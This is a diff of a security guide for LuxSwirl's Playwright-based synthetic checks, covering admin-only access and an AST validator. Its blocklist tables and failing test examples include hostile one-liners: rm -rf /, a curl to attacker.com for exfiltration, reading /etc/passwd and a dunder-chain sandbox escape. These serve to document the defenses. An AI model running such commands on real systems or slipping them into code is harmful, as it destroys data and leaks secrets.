@@ -16,13 +16,14 @@ This document explains LuxSwirl's synthetic check security model, what's allowed
 - [Best Practices](#best-practices)
 - [Deployment Recommendations](#deployment-recommendations)
 
----
+______________________________________________________________________
 
 ## What Are Synthetic Checks?
 
 Synthetic checks use Playwright browser automation to test complex user workflows, JavaScript-heavy applications, and multi-step interactions that simple HTTP checks can't validate.
 
 **Example Use Cases:**
+
 - Login flows with multi-factor authentication
 - E-commerce checkout processes
 - Single-page applications (SPAs) that load content via JavaScript
@@ -30,12 +31,13 @@ Synthetic checks use Playwright browser automation to test complex user workflow
 - Real browser rendering and JavaScript execution
 
 **How They Work:**
+
 - You write Python async functions using Playwright API
 - Code executes on agent hosts with full browser automation
 - Screenshots and traces captured automatically
 - Results reported back to server with detailed step-by-step logs
 
----
+______________________________________________________________________
 
 ## Security Model
 
@@ -44,23 +46,27 @@ Synthetic checks use Playwright browser automation to test complex user workflow
 **Designed for:** Self-hosted, single-organization deployments where administrators are trusted users.
 
 **Security Controls:**
+
 1. **Admin-Only Access** - Only admins can create/modify synthetic checks, enforced in the core service so both the web UI and the REST API are covered. Web users are checked by `role=admin`; the REST API has no role model, so any API Bearer token is admin-equivalent — scope API tokens accordingly.
-2. **AST Validation** - Scripts validated to block obvious attacks (eval, os, subprocess, etc.)
-3. **Security Audit Logging** - All operations logged with SECURITY AUDIT prefix
-4. **Docker Isolation** - Agents run in Docker containers with basic host isolation
-5. **UI Warning Banner** - Prominent security warning when creating/editing
+1. **AST Validation** - Scripts validated to block obvious attacks (eval, os, subprocess, etc.)
+1. **Security Audit Logging** - All operations logged with SECURITY AUDIT prefix
+1. **Docker Isolation** - Agents run in Docker containers with basic host isolation
+1. **UI Warning Banner** - Prominent security warning when creating/editing
 
 **Trust Model:**
+
 - Admin creating synthetic check has equivalent trust to Docker access on agent host
 - Code runs with agent container privileges (environment variables, file system within container)
 
 **Known Limitations:**
+
 - AST validation is NOT a complete sandbox and can be bypassed by determined attackers
 - NOT suitable for multi-tenant SaaS without additional isolation (Kubernetes pods)
 
 ### Future Model (Multi-Tenant SaaS)
 
 For managed SaaS deployments, additional isolation required:
+
 - Kubernetes pod isolation per customer
 - Network policies restricting egress
 - Pod security policies (runAsNonRoot, readOnlyRootFilesystem)
@@ -68,24 +74,27 @@ For managed SaaS deployments, additional isolation required:
 
 See `SECURITY.md` for complete details.
 
----
+______________________________________________________________________
 
 ## Who Can Create Synthetic Checks?
 
 ### Role Requirements
 
 **Admin Users:**
+
 - ✅ Can create synthetic checks
 - ✅ Can modify synthetic check scripts
 - ✅ Can update all check types
 
 **Editor Users:**
+
 - ❌ Cannot create synthetic checks
 - ❌ Cannot modify synthetic check scripts
 - ✅ Can create other check types (HTTP, TCP, JSON, DNS, MySQL, PostgreSQL)
 - ✅ Can modify non-synthetic checks
 
 **Viewer Users:**
+
 - ❌ Cannot create any checks
 - ❌ Cannot modify any checks
 - ✅ Can view all checks and results
@@ -93,19 +102,22 @@ See `SECURITY.md` for complete details.
 ### What Happens if Non-Admin Tries?
 
 **Web UI:**
+
 ```
 Admin access required: Synthetic checks execute arbitrary Python code and
 require administrator privileges. Please contact your administrator.
 ```
+
 - Returns HTTP 403 Forbidden
 - Security warning logged: `User {username} (role=editor) attempted to create synthetic check without admin privileges`
 
 **API:**
+
 - API tokens have admin-level access by design
 - All API users can create synthetic checks
 - Intended for programmatic/trusted access only
 
----
+______________________________________________________________________
 
 ## What's Blocked and Why
 
@@ -113,71 +125,72 @@ require administrator privileges. Please contact your administrator.
 
 These functions allow arbitrary code execution or provide dangerous capabilities:
 
-| Function | Why Blocked | Example Attack |
-|----------|-------------|----------------|
-| `eval()` | Executes arbitrary code | `eval("__import__('os').system('rm -rf /')")` |
-| `exec()` | Executes arbitrary code | `exec("import os; os.system('whoami')")` |
-| `compile()` | Compiles code objects | Used to bypass validation |
-| `__import__()` | Dynamic imports | `__import__('os').system('ls')` |
-| `open()` | File system access | `open('/etc/passwd').read()` |
-| `input()` | Interactive input | Can stall agent |
-| `breakpoint()` | Debugging | Can stall agent |
-| `globals()` | Global namespace access | Access to builtins |
-| `locals()` | Local namespace access | Access to variables |
-| `vars()` | Variable inspection | Object exploration |
-| `dir()` | Object inspection | Discover private attributes |
-| `getattr()` | Attribute access | Dynamic access to dangerous functions |
-| `setattr()` | Attribute modification | Modify object state |
-| `delattr()` | Attribute deletion | Remove security controls |
-| `hasattr()` | Attribute existence | Used for exploration |
+| Function       | Why Blocked             | Example Attack                                |
+| -------------- | ----------------------- | --------------------------------------------- |
+| `eval()`       | Executes arbitrary code | `eval("__import__('os').system('rm -rf /')")` |
+| `exec()`       | Executes arbitrary code | `exec("import os; os.system('whoami')")`      |
+| `compile()`    | Compiles code objects   | Used to bypass validation                     |
+| `__import__()` | Dynamic imports         | `__import__('os').system('ls')`               |
+| `open()`       | File system access      | `open('/etc/passwd').read()`                  |
+| `input()`      | Interactive input       | Can stall agent                               |
+| `breakpoint()` | Debugging               | Can stall agent                               |
+| `globals()`    | Global namespace access | Access to builtins                            |
+| `locals()`     | Local namespace access  | Access to variables                           |
+| `vars()`       | Variable inspection     | Object exploration                            |
+| `dir()`        | Object inspection       | Discover private attributes                   |
+| `getattr()`    | Attribute access        | Dynamic access to dangerous functions         |
+| `setattr()`    | Attribute modification  | Modify object state                           |
+| `delattr()`    | Attribute deletion      | Remove security controls                      |
+| `hasattr()`    | Attribute existence     | Used for exploration                          |
 
 ### Blocked Modules
 
 These modules provide dangerous capabilities:
 
-| Module | Why Blocked | Example Attack |
-|--------|-------------|----------------|
-| `os` | Operating system access | `os.system('curl attacker.com/exfil')` |
-| `subprocess` | Process execution | `subprocess.run(['rm', '-rf', '/'])` |
-| `socket` | Network access | Raw socket connections to internal services |
-| `sys` | System access | Modify Python runtime, exit agent |
-| `importlib` | Dynamic imports | Bypass import restrictions |
-| `pty` | Pseudo-terminal | Spawn interactive shells |
-| `shutil` | File operations | Delete files, copy sensitive data |
-| `pathlib` | File system access | Navigate file system |
-| `pickle` | Arbitrary code execution | Deserialize malicious objects |
-| `marshal` | Arbitrary code execution | Deserialize code objects |
-| `shelve` | Pickle-based storage | Arbitrary code execution |
-| `multiprocessing` | Process spawning | Fork bombs, resource exhaustion |
-| `threading` | Thread spawning | Resource exhaustion |
-| `ctypes` | C library access | Bypass all Python security |
-| `fcntl` | File control (Unix) | Low-level file operations |
-| `signal` | Signal handling | Kill processes |
-| `resource` | Resource limits | Modify resource constraints |
+| Module            | Why Blocked              | Example Attack                              |
+| ----------------- | ------------------------ | ------------------------------------------- |
+| `os`              | Operating system access  | `os.system('curl attacker.com/exfil')`      |
+| `subprocess`      | Process execution        | `subprocess.run(['rm', '-rf', '/'])`        |
+| `socket`          | Network access           | Raw socket connections to internal services |
+| `sys`             | System access            | Modify Python runtime, exit agent           |
+| `importlib`       | Dynamic imports          | Bypass import restrictions                  |
+| `pty`             | Pseudo-terminal          | Spawn interactive shells                    |
+| `shutil`          | File operations          | Delete files, copy sensitive data           |
+| `pathlib`         | File system access       | Navigate file system                        |
+| `pickle`          | Arbitrary code execution | Deserialize malicious objects               |
+| `marshal`         | Arbitrary code execution | Deserialize code objects                    |
+| `shelve`          | Pickle-based storage     | Arbitrary code execution                    |
+| `multiprocessing` | Process spawning         | Fork bombs, resource exhaustion             |
+| `threading`       | Thread spawning          | Resource exhaustion                         |
+| `ctypes`          | C library access         | Bypass all Python security                  |
+| `fcntl`           | File control (Unix)      | Low-level file operations                   |
+| `signal`          | Signal handling          | Kill processes                              |
+| `resource`        | Resource limits          | Modify resource constraints                 |
 
 ### Blocked Attributes
 
 These attributes can be used to escape Python sandbox:
 
-| Attribute | Why Blocked | Example Attack |
-|-----------|-------------|----------------|
-| `__class__` | Type system access | Walk object graph to builtins |
-| `__bases__` | Inheritance access | Access parent classes |
-| `__subclasses__` | Subclass enumeration | Find dangerous classes |
-| `__init__` | Constructor access | Access to function globals |
-| `__globals__` | Global namespace | Access to builtins |
-| `__builtins__` | Built-in functions | Direct access to eval, exec, etc. |
-| `__code__` | Code objects | Inspect and modify bytecode |
-| `__dict__` | Object dictionary | Access internal state |
+| Attribute        | Why Blocked          | Example Attack                    |
+| ---------------- | -------------------- | --------------------------------- |
+| `__class__`      | Type system access   | Walk object graph to builtins     |
+| `__bases__`      | Inheritance access   | Access parent classes             |
+| `__subclasses__` | Subclass enumeration | Find dangerous classes            |
+| `__init__`       | Constructor access   | Access to function globals        |
+| `__globals__`    | Global namespace     | Access to builtins                |
+| `__builtins__`   | Built-in functions   | Direct access to eval, exec, etc. |
+| `__code__`       | Code objects         | Inspect and modify bytecode       |
+| `__dict__`       | Object dictionary    | Access internal state             |
 
 **Example Sandbox Escape (BLOCKED):**
+
 ```python
 # Attempt to walk object graph to access builtins
 page.__class__.__init__.__globals__['__builtins__']
 # Error: Blocked attribute: __class__ at line 2
 ```
 
----
+______________________________________________________________________
 
 ## What's Allowed
 
@@ -185,23 +198,23 @@ page.__class__.__init__.__globals__['__builtins__']
 
 These standard library modules are safe for use in synthetic checks:
 
-| Module | Purpose | Example Use |
-|--------|---------|-------------|
-| `time` | Time utilities | `time.sleep(1)`, `time.time()` |
-| `re` | Regular expressions | `re.search(r'pattern', text)` |
-| `json` | JSON parsing | `json.loads(response)` |
-| `base64` | Base64 encoding | `base64.b64encode(data)` |
-| `hashlib` | Hashing | `hashlib.sha256(data).hexdigest()` |
-| `datetime` | Date/time | `datetime.now()` |
-| `math` | Math functions | `math.ceil(3.14)` |
-| `random` | Random numbers | `random.randint(1, 100)` |
-| `uuid` | UUID generation | `uuid.uuid4()` |
-| `urllib.parse` | URL parsing only | `urllib.parse.urlparse(url)` |
-| `collections` | Data structures | `collections.defaultdict(list)` |
-| `itertools` | Iterator utilities | `itertools.chain(a, b)` |
-| `functools` | Function utilities | `functools.lru_cache()` |
-| `operator` | Operator functions | `operator.add(1, 2)` |
-| `string` | String utilities | `string.ascii_letters` |
+| Module         | Purpose             | Example Use                        |
+| -------------- | ------------------- | ---------------------------------- |
+| `time`         | Time utilities      | `time.sleep(1)`, `time.time()`     |
+| `re`           | Regular expressions | `re.search(r'pattern', text)`      |
+| `json`         | JSON parsing        | `json.loads(response)`             |
+| `base64`       | Base64 encoding     | `base64.b64encode(data)`           |
+| `hashlib`      | Hashing             | `hashlib.sha256(data).hexdigest()` |
+| `datetime`     | Date/time           | `datetime.now()`                   |
+| `math`         | Math functions      | `math.ceil(3.14)`                  |
+| `random`       | Random numbers      | `random.randint(1, 100)`           |
+| `uuid`         | UUID generation     | `uuid.uuid4()`                     |
+| `urllib.parse` | URL parsing only    | `urllib.parse.urlparse(url)`       |
+| `collections`  | Data structures     | `collections.defaultdict(list)`    |
+| `itertools`    | Iterator utilities  | `itertools.chain(a, b)`            |
+| `functools`    | Function utilities  | `functools.lru_cache()`            |
+| `operator`     | Operator functions  | `operator.add(1, 2)`               |
+| `string`       | String utilities    | `string.ascii_letters`             |
 
 ### Playwright API (Full Access)
 
@@ -237,13 +250,14 @@ result = await page.evaluate('() => document.title')
 
 **See:** https://playwright.dev/python/docs/api/class-page
 
----
+______________________________________________________________________
 
 ## Testing Examples
 
 ### ✅ Examples That PASS Validation
 
 #### Example 1: Basic Page Load Check
+
 ```python
 import time
 
@@ -271,6 +285,7 @@ async def run_check(page):
 ```
 
 #### Example 2: Login Flow Check
+
 ```python
 import re
 
@@ -307,6 +322,7 @@ async def run_check(page):
 ```
 
 #### Example 3: E-commerce Checkout Flow
+
 ```python
 import json
 import time
@@ -350,6 +366,7 @@ async def run_check(page):
 ```
 
 #### Example 4: API Response Validation
+
 ```python
 import json
 import base64
@@ -392,17 +409,21 @@ async def run_check(page):
 ### ❌ Examples That FAIL Validation
 
 #### Test 1: Blocked Function - eval()
+
 ```python
 async def run_check(page):
     eval("print('hello')")  # BLOCKED
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked function: eval() at line 2. This function allows arbitrary code execution.
 ```
 
 #### Test 2: Blocked Module - os
+
 ```python
 import os  # BLOCKED
 
@@ -410,60 +431,75 @@ async def run_check(page):
     os.system('whoami')
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked module: os at line 1. This module provides dangerous capabilities
 (file system, process execution, etc.).
 ```
 
 #### Test 3: Blocked Module - subprocess
+
 ```python
 async def run_check(page):
     import subprocess  # BLOCKED
     subprocess.run(['ls', '-la'])
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked module: subprocess at line 2. This module provides dangerous capabilities.
 ```
 
 #### Test 4: Sandbox Escape - __class__
+
 ```python
 async def run_check(page):
     builtins = page.__class__.__init__.__globals__['__builtins__']  # BLOCKED
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked attribute: __class__ at line 2. This attribute can be used to
 escape Python sandbox.
 ```
 
 #### Test 5: File Access - open()
+
 ```python
 async def run_check(page):
     data = open('/etc/passwd').read()  # BLOCKED
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked function: open() at line 2. This function allows arbitrary code execution.
 ```
 
 #### Test 6: Dynamic Import - __import__()
+
 ```python
 async def run_check(page):
     os = __import__('os')  # BLOCKED
     os.system('ls')
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked function: __import__() at line 2. This function allows arbitrary code execution.
 ```
 
 #### Test 7: Network Access - socket
+
 ```python
 import socket  # BLOCKED
 
@@ -472,42 +508,53 @@ async def run_check(page):
     s.connect(('internal-server', 22))
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Blocked module: socket at line 1. This module provides dangerous capabilities.
 ```
 
 #### Test 8: Missing run_check Function
+
 ```python
 async def some_other_function(page):
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 Script must define an async function called 'run_check(page)'.
 ```
 
 #### Test 9: Non-Async run_check
+
 ```python
 def run_check(page):  # Not async
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 run_check() must be defined as an async function (async def run_check(page):)
 ```
 
 #### Test 10: Wrong Function Signature
+
 ```python
 async def run_check():  # Missing page parameter
     return {'status': 'success', 'steps': []}
 ```
+
 **Error:**
+
 ```
 run_check() must accept exactly one parameter named 'page'
 ```
 
----
+______________________________________________________________________
 
 ## Common Errors and Solutions
 
@@ -516,49 +563,54 @@ run_check() must accept exactly one parameter named 'page'
 **Cause:** Non-admin user tried to create/modify synthetic check
 
 **Solution:** Contact your administrator to either:
-1. Upgrade your account to admin role
-2. Have admin create the synthetic check for you
 
----
+1. Upgrade your account to admin role
+1. Have admin create the synthetic check for you
+
+______________________________________________________________________
 
 ### Error: "Blocked function: eval() at line X"
 
 **Cause:** Script uses `eval()`, `exec()`, `compile()`, or similar dangerous function
 
 **Solution:** Remove the blocked function. Use safe alternatives:
+
 - Instead of `eval()`: Parse data with `json.loads()`
 - Instead of dynamic code: Write explicit logic
 - Instead of `exec()`: Structure code as functions
 
----
+______________________________________________________________________
 
 ### Error: "Blocked module: os at line X"
 
 **Cause:** Script imports dangerous module (`os`, `subprocess`, `socket`, etc.)
 
 **Solution:** Remove the import. Use allowed alternatives:
+
 - Instead of `os.path`: Use string manipulation
 - Instead of `subprocess`: Use Playwright's page.evaluate() for JavaScript execution
 - Instead of `socket`: Use Playwright's network capabilities
 
----
+______________________________________________________________________
 
 ### Error: "Blocked attribute: __class__ at line X"
 
 **Cause:** Script attempts sandbox escape via dunder attributes
 
 **Solution:** Remove the attribute access. This is typically:
+
 - Exploratory attack code
 - Copy-pasted from untrusted sources
 - Not needed for legitimate monitoring
 
----
+______________________________________________________________________
 
 ### Error: "Unknown module: requests at line X"
 
 **Cause:** Script imports third-party library not in standard library
 
 **Solution:**
+
 - Remove external dependencies
 - Use Playwright's built-in capabilities for HTTP requests:
   ```python
@@ -569,48 +621,49 @@ run_check() must accept exactly one parameter named 'page'
   }''', 'https://api.example.com')
   ```
 
----
+______________________________________________________________________
 
 ### Error: "Script must define an async function called 'run_check(page)'"
 
 **Cause:** Script missing required function or has wrong name
 
 **Solution:** Ensure your script has this exact signature:
+
 ```python
 async def run_check(page):
     # Your code here
     return {'status': 'success', 'steps': ['Step 1']}
 ```
 
----
+______________________________________________________________________
 
 ## Best Practices
 
 ### ✅ DO
 
 1. **Start with simple checks** - Test basic flows before complex scenarios
-2. **Use explicit waits** - `await page.wait_for_selector()` instead of `time.sleep()`
-3. **Add descriptive steps** - Clear step descriptions help debugging
-4. **Handle exceptions** - Wrap in try/except to provide useful error messages
-5. **Test scripts locally** - Use standalone Playwright to validate before deploying
-6. **Use allowed modules** - Stick to time, re, json, datetime, etc.
-7. **Validate responses** - Check for expected content, not just page load
-8. **Keep scripts focused** - One check should test one user flow
-9. **Review security warnings** - Read the yellow banner carefully
-10. **Monitor audit logs** - Check logs for security events periodically
+1. **Use explicit waits** - `await page.wait_for_selector()` instead of `time.sleep()`
+1. **Add descriptive steps** - Clear step descriptions help debugging
+1. **Handle exceptions** - Wrap in try/except to provide useful error messages
+1. **Test scripts locally** - Use standalone Playwright to validate before deploying
+1. **Use allowed modules** - Stick to time, re, json, datetime, etc.
+1. **Validate responses** - Check for expected content, not just page load
+1. **Keep scripts focused** - One check should test one user flow
+1. **Review security warnings** - Read the yellow banner carefully
+1. **Monitor audit logs** - Check logs for security events periodically
 
 ### ❌ DON'T
 
 1. **Don't use eval/exec** - Always blocked, never needed
-2. **Don't import os/subprocess** - Always blocked, use Playwright instead
-3. **Don't access __class__/__globals__** - Sandbox escape attempts are blocked
-4. **Don't use open()** - File access blocked, use page.content() instead
-5. **Don't import third-party libraries** - Only standard library allowed
-6. **Don't hardcode credentials** - Use environment variables or secure storage
-7. **Don't create overly complex checks** - Break into multiple checks
-8. **Don't ignore timeouts** - Set reasonable timeouts for all operations
-9. **Don't copy untrusted code** - Review all code before deploying
-10. **Don't disable security warnings** - They exist for your protection
+1. **Don't import os/subprocess** - Always blocked, use Playwright instead
+1. **Don't access __class__/__globals__** - Sandbox escape attempts are blocked
+1. **Don't use open()** - File access blocked, use page.content() instead
+1. **Don't import third-party libraries** - Only standard library allowed
+1. **Don't hardcode credentials** - Use environment variables or secure storage
+1. **Don't create overly complex checks** - Break into multiple checks
+1. **Don't ignore timeouts** - Set reasonable timeouts for all operations
+1. **Don't copy untrusted code** - Review all code before deploying
+1. **Don't disable security warnings** - They exist for your protection
 
 ### Script Template
 
@@ -662,13 +715,14 @@ async def run_check(page):
         }
 ```
 
----
+______________________________________________________________________
 
 ## Deployment Recommendations
 
 ### For Self-Hosted (Current)
 
 ✅ **Safe to Deploy:**
+
 - Single organization using LuxSwirl
 - Administrators are trusted employees
 - Agents run in isolated network segment
@@ -676,6 +730,7 @@ async def run_check(page):
 - Strong admin password policies
 
 ⚠️ **Additional Precautions:**
+
 - Limit admin role to minimal necessary users
 - Review all synthetic check scripts before enabling
 - Monitor logs for `SECURITY AUDIT` events
@@ -683,6 +738,7 @@ async def run_check(page):
 - Keep Docker and host systems updated
 
 ❌ **NOT Recommended:**
+
 - Multi-tenant environments (multiple untrusted organizations)
 - Shared hosting with other applications
 - Agents with access to production secrets
@@ -691,6 +747,7 @@ async def run_check(page):
 ### For Managed SaaS (Future)
 
 **Required Before Offering:**
+
 - Kubernetes pod isolation per customer
 - Network policies restricting egress
 - Pod security policies (runAsNonRoot, readOnlyRootFilesystem)
@@ -701,16 +758,17 @@ async def run_check(page):
 
 **See:** `SECURITY.md` for the full security model.
 
----
+______________________________________________________________________
 
 ## Getting Help
 
 ### Security Questions
 
 If you have security concerns or questions:
+
 1. Review `SECURITY.md` for complete security model
-2. Check audit logs: `docker logs luxswirl_server | grep "SECURITY AUDIT"`
-3. Contact your security team for policy guidance
+1. Check audit logs: `docker logs luxswirl_server | grep "SECURITY AUDIT"`
+1. Contact your security team for policy guidance
 
 ### Reporting Security Issues
 
@@ -719,11 +777,12 @@ If you discover a security vulnerability, follow the [security policy](../../SEC
 ### Feature Requests
 
 For synthetic check feature requests:
-1. Open GitHub issue describing use case
-2. Provide example of what you're trying to achieve
-3. Explain why current capabilities don't meet needs
 
----
+1. Open GitHub issue describing use case
+1. Provide example of what you're trying to achieve
+1. Explain why current capabilities don't meet needs
+
+______________________________________________________________________
 
 ## References
 
